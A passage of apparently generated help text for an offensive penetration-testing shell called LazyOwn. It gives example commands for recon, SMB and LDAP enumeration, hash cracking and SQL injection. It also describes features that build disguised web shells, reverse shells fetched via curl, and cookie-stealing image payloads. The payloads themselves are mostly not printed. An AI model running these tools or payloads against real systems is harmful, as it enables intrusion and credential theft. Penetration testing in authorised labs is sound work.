For example:
    whatweb example.com

## enum4linux
Performs enumeration of information from a target Linux/Unix system using `enum4linux`.

1. Executes the `enum4linux` command with the `-a` option to gather extensive information from the specified target.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target host for enumeration, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually enumerate information from a Linux/Unix system, use the following command:
    enum4linux -a <target_host>

Replace `<target_host>` with the IP address or hostname of the target system.

For example:
    enum4linux -a 192.168.1.10

## nbtscan
Performs network scanning using `nbtscan` to discover NetBIOS names and addresses in a specified range.

1. Executes the `nbtscan` command with the `-r` option to scan the specified range of IP addresses for NetBIOS information.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The target network range for scanning, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform a NetBIOS scan across a network range, use the following command:
    sudo nbtscan -r <network_range>

Replace `<network_range>` with the IP address range you want to scan. For example:
    sudo nbtscan -r 192.168.1.0/24

## rpcclient
Executes the `rpcclient` command to interact with a remote Windows system over RPC (Remote Procedure Call) using anonymous credentials.

1. Runs `rpcclient` with the `-U ''` (empty username) and `-N` (no password) options to connect to the target host specified by `rhost`.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the remote host to connect to, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually interact with a remote Windows system using RPC, use the following command:
    rpcclient -U '' -N <target_ip>

Replace `<target_ip>` with the IP address of the target system. For example:
    rpcclient -U '' -N 10.10.10.10

## nikto
Runs the `nikto` tool to perform a web server vulnerability scan against the specified target host.

1. Executes `nikto` with the `-h` option to specify the target host IP address.
2. Installs `nikto` if it is not already installed.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the target web server, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform a web server vulnerability scan using `nikto`, use the following command:
    nikto -h <target_ip>

Replace `<target_ip>` with the IP address of the target web server. For example:
    nikto -h 10.10.10.10

## finalrecon
Runs the `finalrecon` tool to perform a web server vulnerability scan against the specified target host.

1. Executes `finalrecon` with the `-h` option to specify the target host IP address.

:param line: This parameter is not used in the current implementation but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the target web server, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform a web server vulnerability scan using `finalrecon`, use the following command:
    finalrecon --url=http://<target_ip> --full -o txt -cd <directory_reports> 

Replace `<target_ip>` with the IP address of the target web server. For example:
    finalrecon --url=http://192.168.1.92 --full -o txt -cd /home/gris/finalrecon 

## openssl_sclient
Uses `openssl s_client` to connect to a specified host and port, allowing for testing and debugging of SSL/TLS connections.

:param line: The port number to connect to on the target host. This must be provided as an argument.
:param rhost: The IP address or hostname of the target server, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually connect to a server using `openssl s_client` and test SSL/TLS, use the following command:
    openssl s_client -connect <target_ip>:<port>

Replace `<target_ip>` with the IP address or hostname of the target server and `<port>` with the port number. For example:
    openssl s_client -connect 10.10.10.10:443

## ss
Uses `searchsploit` to search for exploits in the Exploit Database based on the provided search term.

:param line: The search term or query to find relevant exploits. This must be provided as an argument.

:returns: None

Manual execution:
To manually search for exploits using `searchsploit`, use the following command:
    searchsploit <search_term>

Replace `<search_term>` with the term or keyword you want to search for. For example:
    searchsploit kernel

## wfuzz
Uses `wfuzz` to perform fuzzing based on provided parameters. This function supports various options for directory and file fuzzing.

:param line: The options and arguments for `wfuzz`. The `line` parameter can include the following:
    - `sub <domain>`: Fuzz DNS subdomains. Requires `dnswordlist` to be set.
    - `iis`: Fuzz IIS directories. Uses a default wordlist if `iiswordlist` is not set.
    - Any other argument: General directory and file fuzzing.

:returns: None

Manual execution:
To manually use `wfuzz` for directory and file fuzzing, use the following commands:

1. For fuzzing DNS subdomains:
    wfuzz -c <extra_options> -t <threads> -w <wordlist> -H 'Host: FUZZ.<domain>' <domain>

Example:
    wfuzz -c --hl=7 -t 200 -w /path/to/dnswordlist -H 'Host: FUZZ.example.com' example.com

2. For fuzzing IIS directories:
    wfuzz -c <extra_options> -t <threads> -w /path/to/iiswordlist http://<rhost>/FUZZ

Example:
    wfuzz -c --hl=7 -t 200 -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.10/FUZZ

3. For general directory and file fuzzing:
    wfuzz -c <extra_options> -t <threads> -w <wordlist> http://<rhost>/FUZZ

Example:
    wfuzz -c --hl=7 -t 200 -w /path/to/dirwordlist http://10.10.10.10/FUZZ

## launchpad
Searches for packages on Launchpad based on the provided search term and extracts codenames from the results. The distribution is extracted from the search term.

:param line: The search term to be used for querying Launchpad. The `line` parameter should be a string containing
            the search term, e.g., "8.2p1 Ubuntu 4ubuntu0.11".

:returns: None

Manual execution:
To manually execute the equivalent command, use the following steps:

1. Extract the distribution from the search term:
- This function assumes the distribution name is part of the search term and is used to build the URL.

2. URL encode the search term:
- Replace spaces with `%20` to form the encoded search query.

3. Use `curl` to perform the search and filter results:
curl -s "https://launchpad.net/+search?field.text=<encoded_search_term>" | grep 'href' | grep '<distribution>' | grep -oP '(?<=href="https://launchpad.net/<distribution>/)[^/"]+' | sort -u

Example:
    If the search term is "8.2p1 Ubuntu 4ubuntu0.11", the command would be:
    curl -s "https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11" | grep 'href' | grep 'ubuntu' | grep -oP '(?<=href="https://launchpad.net/ubuntu/)[^/"]+' | sort -u

Notes:
    - Ensure that `curl` is installed and accessible in your environment.
    - The extracted codenames are printed to the console.

## gobuster
Uses `gobuster` for directory and virtual host fuzzing based on provided parameters. Supports directory enumeration and virtual host discovery.

:param line: The options and arguments for `gobuster`. The `line` parameter can include the following:
    - `url`: Perform directory fuzzing on a specified URL. Requires `url` and `dirwordlist` to be set.
    - `vhost`: Perform virtual host discovery on a specified URL. Requires `url` and `dirwordlist` to be set.
    - Any other argument: General directory fuzzing with additional parameters.

:returns: None

Manual execution:
To manually use `gobuster`, use the following commands:

1. For directory fuzzing:
    gobuster dir --url <url>/ --wordlist <wordlist>

Example:
    gobuster dir --url http://example.com/ --wordlist /path/to/dirwordlist

2. For virtual host discovery:
    gobuster vhost --append-domain -u <url> -w <wordlist> --random-agent -t 600

Example:
    gobuster vhost --append-domain -u http://example.com -w /path/to/dirwordlist --random-agent -t 600

3. For general directory fuzzing with additional parameters:
    gobuster dir --url http://<rhost>/ --wordlist <wordlist> <additional_parameters>

Example:
    gobuster dir --url http://10.10.10.10/ --wordlist /path/to/dirwordlist -x .php,.html

## addhosts
Adds an entry to the `/etc/hosts` file, mapping an IP address to a domain name.

:param line: The domain name to be added to the `/etc/hosts` file.
    - Example: `permx.htb`

:returns: None

Manual execution:
To manually add a domain to the `/etc/hosts` file, use the following command:

    sudo sh -c -e "echo '<rhost> <domain>' >> /etc/hosts"

Example:
    sudo sh -c -e "echo '10.10.11.23 permx.htb' >> /etc/hosts"

This command appends the IP address and domain name to the `/etc/hosts` file, enabling local resolution of the domain.

## cme
Performs an SMB enumeration using `crackmapexec`.

:param line: Not used in this function.

:returns: None

Manual execution:
To manually run `crackmapexec` for SMB enumeration, use the following command:

    crackmapexec smb <target>

Example:
    crackmapexec smb 10.10.11.24

This command will enumerate SMB shares and perform basic SMB checks against the specified target IP address.

## ldapdomaindump
Dumps LDAP information using `ldapdomaindump` with credentials from a file.

:param line: The domain to use for authentication (e.g., 'domain.local').

:returns: None

Manual execution:
To manually run `ldapdomaindump` for LDAP enumeration, use the following command:

    ldapdomaindump -u '<domain>\<username>' -p '<password>' <target>

Example:
    ldapdomaindump -u 'domain.local\Administrator' -p 'passadmin123' 10.10.11.23

Ensure you have a file `sessions/credentials.txt` in the format `user:password`, where each line contains credentials for the LDAP enumeration.

## bloodhound
Perform LDAP enumeration using bloodhound-python with credentials from a file.

:param line: This parameter is not used in the function but could be used for additional options or domain information.

:returns: None

Manual execution:
To manually run `bloodhound-python` for LDAP enumeration, use the following command:

    bloodhound-python -c All -u '<username>' -p '<password>' -ns <target>

Example:
    bloodhound-python -c All -u 'usuario' -p 'password' -ns 10.10.10.10

Ensure you have a file `sessions/credentials.txt` with the format `user:password`, where each line contains credentials for enumeration.

## ping
Perform a ping to check host availability and infer the operating system based on TTL values.

:param line: This parameter is not used in the function but could be used for additional options or settings.

:returns: None

Manual execution:
To manually ping a host and determine its operating system, use the following command:

    ping -c 1 <target>

Example:
    ping -c 1 10.10.10.10

The TTL (Time To Live) value is used to infer the operating system:
- TTL values around 64 typically indicate a Linux system.
- TTL values around 128 typically indicate a Windows system.

Ensure you have set `rhost` to the target host for the command to work.

## gospider
Try gospider for web spidering.

This function executes the `gospider` tool to perform web spidering. It can either use a URL provided as a parameter or the remote host defined in `self.params`.

Usage:
    gospider url
    gospider

:param line: Command parameter that determines the execution mode. Use "url" to specify a URL, or leave empty to use the remote host.
:type line: str

- If `line` is "url", the method uses the URL specified in `self.params["url"]`.
- If `line` is not "url", the method uses the remote host specified in `self.params["rhost"]`.

:returns: None

Manual execution:
1. Ensure that the `gospider` tool is installed on the system.
2. Set the `url` parameter if using the "url" mode.
3. Run the method to perform the spidering operation.

Dependencies:
- `gospider` must be installed on the system.
- The `sudo` command must be available for installing `gospider`.

Examples:
    1. To scan a specific URL: `gospider url`
    2. To scan the remote host: `gospider`

Note:
    - If `gospider` is not installed, the method will attempt to install it.
    - Ensure that the network and tools are configured correctly for successful execution.

## arpscan
Executes an ARP scan using `arp-scan`.

This function performs an ARP scan on the local network using the `arp-scan` tool. The network device to be used for scanning must be specified.

Usage:
    arpscan

:param line: Command parameters (not used in this function).
:type line: str

- Executes the `arp-scan` command with the specified network device.

:returns: None

Manual execution:
1. Ensure that the network device is set using the appropriate parameter.
2. Run the method to perform an ARP scan.

Dependencies:
- `arp-scan` must be installed on the system.
- The `sudo` command must be available for executing `arp-scan`.

Examples:
    1. Set the device parameter using `set device <network_device>`.
    2. Run `arpscan` to perform the ARP scan.

Note:
    - The network device must be configured and available on the system for the scan to work.
    - Ensure that `arp-scan` is installed and accessible from the command line.

## lazypwn
Executes the LazyPwn script.

This function runs the `lazypwn.py` script located in the `modules` directory. The script is typically used for automated exploitation or security testing tasks within the LazyOwn framework.

Usage:
    lazypwn

:param line: Command parameters (not used in this function).
:type line: str

- Executes the `lazypwn.py` script with Python 3.

:returns: None

Manual execution:
1. Run the method to execute the LazyPwn script.

Dependencies:
- The `lazypwn.py` script must be present in the `modules` directory.
- Python 3 must be installed and accessible from the command line.

Examples:
    1. Run `do_lazypwn` to execute the LazyPwn script.

Note:
    - Ensure that `lazypwn.py` is configured correctly before running this method.
    - The script's functionality depends on its implementation in `modules/lazypwn.py`.

## fixel
Fixes file permissions and line endings in the project directories.

This function converts line endings from DOS/Windows format to Unix format for all files in the project directories. This helps to ensure consistent line endings and can prevent issues related to file format mismatches.

Usage:
    fixel

:param line: Command parameters (not used in this function).
:type line: str

:returns: None

Manual execution:
1. Run the method to fix line endings in the specified directories.

Dependencies:
- The `dos2unix` command must be installed and accessible from the command line.

Examples:
    1. Run `do_fixel` to convert line endings for all files in the project directories.

Note:
    - This method only fixes line endings and does not modify file permissions.
    - Ensure that the `dos2unix` command is installed and functioning correctly.

## smbserver
Sets up an SMB server using Impacket and creates an SCF file for SMB share access.

This function configures an SMB server to serve files from the `sessions` directory and generates an SCF file that points to the SMB share. The SCF file can be used to create a shortcut to the SMB share on a Windows system.

Usage:
    smbserver

:param line: Command parameters folder name (optional).
:type line: str

- Checks if `lhost` is valid using the `check_lhost` function.
- Creates an SCF file (`sessions/file.scf`) with configuration to access the SMB share.
- Copies a curl command to the clipboard for downloading the SCF file from the SMB share.
- Starts an SMB server using Impacket to serve the `sessions` directory.

:returns: None

Manual execution:
1. Ensure `lhost` is set to a valid IP address or hostname.
2. Run the method to create the SCF file and start the SMB server.
3. Use the copied curl command to download the SCF file on the target system.
4. Ensure that `impacket-smbserver` is installed and accessible from the command line.

Dependencies:
- The `impacket-smbserver` tool must be installed and accessible from the command line.
- The `check_lhost` function must validate the `lhost` parameter.

Examples:
    1. Run `do_smbserver` to set up the SMB server and generate the SCF file.
    2. Use the provided curl command to download the SCF file on the target system.

Note:
    - The SCF file is used to create a shortcut to the SMB share and should be accessible from the target system.
    - Ensure that the `lhost` parameter is correctly set and that the SMB server is properly configured.

## sqlmap
Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser). 

This function allows the execution of sqlmap commands with various options, including testing URL endpoints, reading from request files, and using sqlmap's wizard mode for easy configuration.

Usage:
    sqlmap req <request_file>
    sqlmap req <request_file> <parameter>
    sqlmap req <request_file> <parameter> <database>
    sqlmap req <request_file> <parameter> <database> <table>
    sqlmap -wiz

:param line: Command parameters for sqlmap.
:type line: str

- If `line` starts with `req`, it expects the following formats:
- `req <request_file> <parameter>`: Tests the specified parameter in the request file for SQL injection.
- `req <request_file> <parameter> <database>`: Tests the specified parameter and attempts to dump tables from the specified database.
- `req <request_file> <parameter> <database> <table>`: Tests the specified parameter and attempts to dump data from the specified table in the database.

- If `line` starts with `-wiz`, it runs sqlmap's wizard mode for interactive configuration.

- If `line` is empty, it uses the URL specified in `self.params["url"]` to perform SQL injection testing with sqlmap.

:returns: None

Manual execution:
1. If using `req`, provide a valid request file and parameters.
2. Run sqlmap with the specified options for SQL injection testing.
3. To use the wizard mode, execute `sqlmap -wizard`.
4. For URL-based testing, ensure `url` is set and run sqlmap with the URL.

Dependencies:
- The `sqlmap` tool must be installed and accessible from the command line.
- The request file specified in `req` should be located in the `sessions` directory.

Examples:
    sqlmap req requests.txt id
    sqlmap req requests.txt id database_name
    sqlmap req requests.txt id database_name table_name
    sqlmap -wiz

Note:
    - Ensure the request file exists and is readable before running sqlmap.
    - The URL must be set for URL-based testing.
    - The wizard mode is useful for interactive configuration if you're unsure about the options.

## proxy
Runs a small proxy server to modify HTTP requests on the fly.

This function starts the `lazyproxy.py` script, which acts as a proxy server for intercepting and modifying HTTP requests. The server listens on port 8888.

Usage:
    proxy

:param line: This parameter is not used in the current implementation.
:type line: str
:returns: None

Manual execution:
1. Executes the `lazyproxy.py` script to start the proxy server.
2. The proxy server will run and modify requests as configured in the script.

Dependencies:
- The `lazyproxy.py` script must be available in the `modules` directory.

Example:
    proxy

Note:
    - Ensure that the `lazyproxy.py` script is correctly configured before running.
    - The proxy server will be accessible at `http://localhost:8888`.
    - To stop the proxy server, terminate the running process manually.

## createwebshell
Creates a web shell disguised as a `.jpg` file in the `sessions` directory.

This function performs the following actions:
1. Runs a Python script `lazycreate_webshell.py` to create a disguised web shell.
2. Downloads a PHP web shell from a specified URL and saves it to the `sessions` directory.

Usage:
    createwebshell

:param line: This parameter is not used in the current implementation.
:type line: str
:returns: None

Manual execution:
1. Executes the `lazycreate_webshell.py` script to create a web shell disguised as a `.jpg` file.
2. Downloads a PHP web shell from the GitHub repository and saves it to `sessions`.

Dependencies:
- `wget` must be installed for downloading the web shell.
- The `lazycreate_webshell.py` script must be available in the `modules` directory.

Example:
    createwebshell

Note:
    - Ensure that the `lazycreate_webshell.py` script is correctly configured and accessible.
    - Verify the URL in the `wget` command to ensure it points to a valid and safe web shell.

## createrevshell
Creates a bash reverse shell script in the `sessions` directory with the specified `lhost` and `lport` values.

This function performs the following actions:
1. Checks if `lhost` and `lport` are set. If not, it prints an error message and exits.
2. Creates a bash reverse shell script using the provided `lhost` and `lport` values.
3. Saves the script to `sessions/revshell.sh`.
4. Prints a message with the `curl` command to download and execute the reverse shell script.
5. Copies the `curl` command to the clipboard.

Usage:
    createrevshell

:param line: This parameter is not used in the current implementation.
:type line: str
:returns: None

Manual execution:
1. Creates or overwrites the file `sessions/revshell.sh` with the bash reverse shell script.
2. Displays the command to download and execute the script via `curl`.
3. Copies the `curl` command to the clipboard for easy use.

Dependencies:
- Bash must be installed on the target system.
- `xclip` must be installed for copying the command to the clipboard.

Example:
    createrevshell

Note:
    - Ensure that `lhost` and `lport` are set before running this command.
    - The script will listen for incoming connections on the specified `lport` and connect back to `lhost`.
    - Adjust the `lhost` and `lport` as needed for your specific environment.

## createwinrevshell
Creates a PowerShell reverse shell script in the `sessions` directory with the specified `lhost` and `lport` values.

This function performs the following actions:
1. Checks if `lhost` and `lport` are set. If not, it prints an error message and exits.
2. Creates a PowerShell reverse shell script using the provided `lhost` and `lport` values.
3. Saves the script to `sessions/revshell.ps1`.
4. Prints a message with the command to download and execute the reverse shell script via `curl`.
5. Copies the `curl` command to the clipboard.

Usage:
    createwinrevshell

:param line: This parameter is not used in the current implementation.
:type line: str
:returns: None

Manual execution:
1. Creates or overwrites the file `sessions/revshell.ps1` with the PowerShell reverse shell script.
2. Displays the command to download and execute the script via `curl`.
3. Copies the `curl` command to the clipboard for easy use.

Dependencies:
- PowerShell must be installed on the target system.
- `xclip` must be installed for copying the command to the clipboard.

Example:
    createwinrevshell

Note:
    - Ensure that `lhost` and `lport` are set before running this command.
    - The script will listen for incoming connections on the specified `lport` and connect back to `lhost`.
    - Adjust the `lhost` and `lport` as needed for your specific environment.

## createhash
Creates a `hash.txt` file in the `sessions` directory with the specified hash value and analyzes it using `Name-the-hash`.

This function performs the following actions:
1. Validates the input line to ensure it is not empty.
2. Backs up the existing `hash.txt` file if it exists, renaming it to `hash_{timestamp}.txt` based on the current timestamp.
3. Writes the provided hash value to `sessions/hash.txt`.
4. Analyzes the hash value using `Name-the-hash`.

Usage:
    createhash <hash>

:param line: The hash value to be written to `hash.txt` and analyzed.
:type line: str
:returns: None

Manual execution:
1. Creates or overwrites the file `sessions/hash.txt` with the specified hash value.
2. Analyzes the hash value using the `nth` command.

Dependencies:
- `sessions/hash.txt` will be created in the `sessions` directory.
- `Name-the-hash` must be installed and accessible via the command `nth`.

Example:
    createhash 5f4dcc3b5aa765d61d8327deb882cf99

Note:
    - Ensure the hash value is correct before running the analysis.
    - The hash value should be provided as a single argument without extra characters or spaces.

## createcredentials
Creates a `credentials.txt` file in the `sessions` directory with the specified username and password.

This function performs the following actions:
1. Validates the input line to ensure it contains a colon (`:`), indicating the presence of both a username and password.
2. Backs up the existing `credentials.txt` file if it exists, renaming it to `credentials_{username}.txt` based on the existing username.
3. Writes the valid input to `sessions/credentials.txt`.

Usage:
    createcredentials user:password

:param line: The input line containing the username and password in the format `user:password`.
:type line: str
:returns: None

Manual execution:
1. Creates or overwrites the file `sessions/credentials.txt` with the specified username and password.

Dependencies:
- `sessions/credentials.txt` will be created in the `sessions` directory.

Example:
    createcredentials administrator:passwordadministrator123&!

Note:
    - Ensure the input format is correct: `user:password`.
    - The credentials should be properly formatted with a colon separating the username and password.

## createcookie
Creates a `cookie.txt` file in the `sessions` directory with the specified cookie value.

This function performs the following actions:
1. Extracts the cookie value from the provided input line using a regular expression.
2. Writes the extracted cookie value to `sessions/cookie.txt`.

Usage:
    createcookie cookie=user_data=valor_base64

:param line: The input line containing the cookie value in the format `cookie=value`.
:type line: str
:returns: None

Manual execution:
1. Creates or overwrites the file `sessions/cookie.txt` with the extracted cookie value.

Dependencies:
- `sessions/cookie.txt` will be created in the `sessions` directory.

Example:
    createcookie cookie=user_data=valor_base64

Note:
    - Ensure the input format is correct: `cookie=value`.
    - The cookie value should be properly encoded and formatted as needed.

## download_resources
Downloads resources into the `sessions` directory.

This function performs the following actions:
1. Changes to the `sessions` directory and executes `download_resources.sh` to download required resources.

Usage:
    download_resources

:param line: Not used in this function.
:type line: str
:returns: None

Manual execution:
1. Runs the `download_resources.sh` script in the `sessions` directory to download necessary resources.

Dependencies:
- `download_resources.sh` must be present in the `sessions` directory.

Example:
    download_resources

Note:
    - Ensure that the `download_resources.sh` script is present in the `sessions` directory and is executable.
    - After running this command, you can use the `www` command as indicated by the printed message.

## download_exploit
Downloads and sets up exploits in the `external/.exploits/` directory and starts a web server to serve the files.

This function performs the following actions:
1. Changes to the `external` directory and executes `install_external.sh` to install necessary components or exploits.
2. Displays the IP addresses associated with network interfaces and copies the IP address of `tun0` to the clipboard.
3. Lists the contents of the `external/.exploit` directory and starts a web server on port 8443 to serve the files in that directory.
4. Prints a message indicating the server's status and the port it's running on.

Usage:
    download_exploit

:param line: Not used in this function.
:type line: str
:returns: None

Manual execution:
1. Runs the `install_external.sh` script to set up necessary components or exploits.
2. Displays network interface IP addresses and copies the IP address of `tun0` to the clipboard.
3. Lists the contents of `external/.exploit` directory.
4. Starts a Python HTTP server on port 8443 in the `external/.exploit` directory to serve files.

Dependencies:
- `install_external.sh` must be present in the `external` directory.
- `xclip` must be installed for clipboard operations.
- Python 3 must be installed to run the HTTP server.

Example:
    download_exploit

Note:
    - Ensure that the `install_external.sh` script is correctly configured and present in the `external` directory.
    - The HTTP server will be accessible on port 8443.
    - The function assumes the presence of `external/.exploit` directory and serves files from there.

## dirsearch
Runs the `dirsearch` tool to perform directory and file enumeration on a specified URL.

This function executes `dirsearch` to scan a given URL for directories and files, while excluding specific HTTP status codes from the results. If `dirsearch` is not installed, the function will attempt to install it before running the scan.

Usage:
    dirsearch <url>

:param line: Not used in this function. The URL is provided via the `url` parameter.
:type line: str
:returns: None

Manual execution:
1. If `dirsearch` is present, the command `dirsearch -u <url> -x 403,404,400` is executed.
2. If `dirsearch` is not present, the function installs `dirsearch` using `sudo apt install dirsearch -y` and then runs the command.

Dependencies:
- `dirsearch` must be installed. If not present, it will be installed using `sudo apt`.
- Ensure the URL is set via the `url` parameter before calling this function.

Example:
    dirsearch http://example.com/

Note:
    - Ensure that the `url` parameter is set before calling this function.
    - The `-x` option specifies HTTP status codes to exclude from the results (e.g., 403, 404, 400).
    - The function will attempt to install `dirsearch` if it is not already installed.

## john2hash
Runs John the Ripper with a specified wordlist and options.

This function executes John the Ripper to crack hashes using the specified wordlist and additional options. If no additional options are provided, it will attempt to display cracked hashes.

Usage:
    john2hash <options>

:param line: Optional arguments to be passed to John the Ripper (e.g., `--format=Raw-SHA512`). If not provided, the function will default to showing the cracked hashes.
:type line: str
:returns: None

Manual execution:
1. If `line` is provided, the command `sudo john sessions/hash.txt --wordlist=<wordlist> <options>` is executed.
2. If `line` is not provided, the command `sudo john sessions/hash.txt --wordlist=<wordlist>` is executed to display the cracked hashes.

Dependencies:
- John the Ripper must be installed and available in the system's PATH.
- Ensure the wordlist file exists at the specified path.
- The `sessions/hash.txt` file must contain the hashes to be cracked.

Example:
    john2hash --format=Raw-SHA512
    # If `wordlist` is set to `/usr/share/wordlists/rockyou.txt`, the command executed will be `sudo john sessions/hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA512`.

Note:
    - Ensure that the `wordlist` parameter is set before calling this function.
    - Provide the necessary options as a string argument (e.g., `--format=Raw-SHA512`) if needed.
    - If no options are provided, the function defaults to showing the cracked hashes.

## hashcat
Runs Hashcat with specified attack mode and hash type using a wordlist.

This function executes the Hashcat tool with the specified mode and wordlist file. The hash value to be cracked should be provided as an argument.

Usage:
    hashcat <mode>

:param line: The hash type or mode to be used with Hashcat (e.g., 0 for MD5). This is a required argument.
:type line: str
:returns: None

Manual execution:
1. The command `hashcat -a 0 -m <mode> <hash> <wordlist>` is executed, where `<mode>` is the hash type, `<hash>` is the hash to be cracked, and `<wordlist>` is the path to the wordlist file.

Dependencies:
- Hashcat must be installed and available in the system's PATH.
- Ensure the wordlist file exists at the specified path.

Example:
    hashcat 0
    # If `wordlist` is set to `/usr/share/wordlists/rockyou.txt` and `line` is `0`, the command executed will be `hashcat -a 0 -m 0 /usr/share/wordlists/rockyou.txt`.

Note:
    - Ensure that the `wordlist` parameter is set before calling this function.
    - The hash to be cracked must be passed as an argument when calling the function.
    - Replace `<mode>` with the appropriate Hashcat mode number (e.g., `0` for MD5, `1000` for NTLM).

## complete_hashcat
Complete mode options and file paths for the sessions/hash.txt

## responder
Runs Responder on a specified network interface with elevated privileges.

This function executes the Responder tool with `sudo` on the network interface provided in the `device` parameter.

Usage:
    responder

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
1. The command `sudo responder -I <device>` is executed, where `<device>` is the network interface specified by the user.

Dependencies:
- The function relies on `sudo` to run Responder with root privileges.
- Ensure that Responder is installed and available in the system's PATH.

Example:
    responder
    # If `device` is set to `tun0`, the command executed will be `sudo responder -I tun0`.

Note:
    - Ensure that the `device` parameter is set before calling this function.
    - Replace `<device>` with the appropriate network interface, such as `tun0`, `eth0`, etc.
    - Running Responder requires root privileges, so make sure the user running the command has the necessary permissions.

## ip
Displays IP addresses of network interfaces and copies the IP address from the `tun0` interface to the clipboard.

This function performs the following tasks:
1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
2. Copies the IP address from the `tun0` interface to the clipboard using `xclip`.

Usage:
    ip

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
2. The IP address of the `tun0` interface is copied to the clipboard using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip`.

Dependencies:
- The function relies on `awk`, `grep`, `cut`, and `xclip` to process and copy the IP address.

Example:
    ip
    # This will display IP addresses for all network interfaces and copy the IP address from `tun0` to the clipboard.

Note:
    Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the clipboard will not be updated.

## ipp
Displays IP addresses of network interfaces and prints the IP address from the `tun0` interface.

This function performs the following tasks:
1. Displays IP addresses for all network interfaces using `ip a show scope global` and `awk`.
2. Prints the IP address from the `tun0` interface.

Usage:
    ip

:param line: This parameter is not used in the function but is included for consistency with other command methods.
:type line: str
:returns: None

Manual execution:
1. The command `ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [[96m" iface"[0m] "a[1] }'` is executed to display the IP addresses of all network interfaces.
2. The IP address of the `tun0` interface is printed to the console using the command `ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1`.

Dependencies:
- The function relies on `awk`, `grep`, `cut`, and `xclip` to process and display the IP address.

Example:
    ip
    # This will display IP addresses for all network interfaces and print the IP address from `tun0`.

Note:
    Ensure that the `tun0` interface exists and has an IP address assigned. If `tun0` is not present or has no IP address, the address will not be displayed.

## rhost
Copies the remote host (rhost) to the clipboard and updates the command prompt.

This function performs two tasks:
1. It copies the `rhost` parameter to the clipboard if it is valid.
2. It updates the command prompt to include the `rhost` and the current working directory.

Usage:
    rhost [clean]

:param line: An optional argument that determines the behavior of the function:
    - If 'clean', it resets the command prompt to its default format.
    - If any other value, it updates the command prompt to include the `rhost` and current working directory.
:type line: str
:returns: None

Manual execution:
1. If `line` is 'clean':
- The command prompt is reset to its default format.
2. If `line` is any other value:
- The command prompt is updated to show the `rhost` and the current working directory.
- The `rhost` is copied to the clipboard using `xclip`.

Dependencies:
- The script uses `xclip` to copy the `rhost` to the clipboard.

Example:
    rhost
    # This will copy the current `rhost` to the clipboard and update the prompt.
    
    rhost clean
    # This will reset the command prompt to its default format.

Note:
    Ensure that the `rhost` is valid by checking it with the `check_rhost` function before copying it to the clipboard.

## rrhost
Updates the command prompt to include the remote host (rhost) and current working directory.

This function performs two tasks:
1. It updates the command prompt to include the `rhost` and the current working directory if `line` is not 'clean'.
2. It resets the command prompt to its default format if `line` is 'clean'.

Usage:
    rhost [clean]

:param line: An optional argument that determines the behavior of the function:
    - If 'clean', it resets the command prompt to its default format.
    - If any other value, it updates the command prompt to include the `rhost` and current working directory.
:type line: str
:returns: None

Manual execution:
1. If `line` is 'clean':
- The command prompt is reset to its default format.
2. If `line` is any other value:
- The command prompt is updated to show the `rhost` and the current working directory.

Example:
    rhost
    # This will update the command prompt to include the `rhost` and current working directory.
    
    rhost clean
    # This will reset the command prompt to its default format.

Note:
    Ensure that the `rhost` is valid by checking it with the `check_rhost` function before updating the prompt.

## banner
Show the banner

## py3ttyup
Copies a Python reverse shell command to the clipboard.

This function generates a Python command that uses the `pty` module to spawn a new shell and copies it to the clipboard. This is typically used for creating a TTY shell in a reverse shell situation.

Usage:
    py3ttyup

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
1. The function creates a Python command with `pty.spawn` to open a shell.
2. The command is copied to the clipboard using `xclip`.
3. A message is printed to inform the user that the command has been copied.

Dependencies:
- The script uses `xclip` to copy the command to the clipboard.

Example:
    py3ttyup
    # This will copy the Python command `python3 -c 'import pty; pty.spawn("/bin/bash")'` to the clipboard.

Note:
    This command is often used in scenarios where you need a more interactive shell from a reverse shell connection.

## rev
Copies a reverse shell payload to the clipboard.

This function generates a reverse shell command that connects back to the specified host and port, and copies it to the clipboard. It also provides a way to execute the payload via a PHP-based web shell.

Usage:
    rev

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
1. Ensure that `lhost`, `lport`, and `rhost` parameters are set.
2. The function generates a reverse shell command in Bash and prints instructions for using the payload.
3. It also provides an example URL and PHP code snippet that decodes and executes the base64-encoded payload.
4. The reverse shell command is copied to the clipboard using `xclip`.

Dependencies:
- The script uses `xclip` to copy the command to the clipboard.
- Base64 encoding is used to obfuscate the payload.

Example:
    rev
    # This will copy a reverse shell command to the clipboard and display instructions for its use.

## img2cookie
Copies a malicious image tag payload to the clipboard.

This function crafts and copies two different image tag payloads designed to steal cookies from a target's browser. The payloads use JavaScript to send cookies to a specified host and port. The user is prompted to select which payload to copy to the clipboard.

Usage:
    img2cookie

:param line: This parameter is not used in the function.
:type line: str
:returns: None

Manual execution:
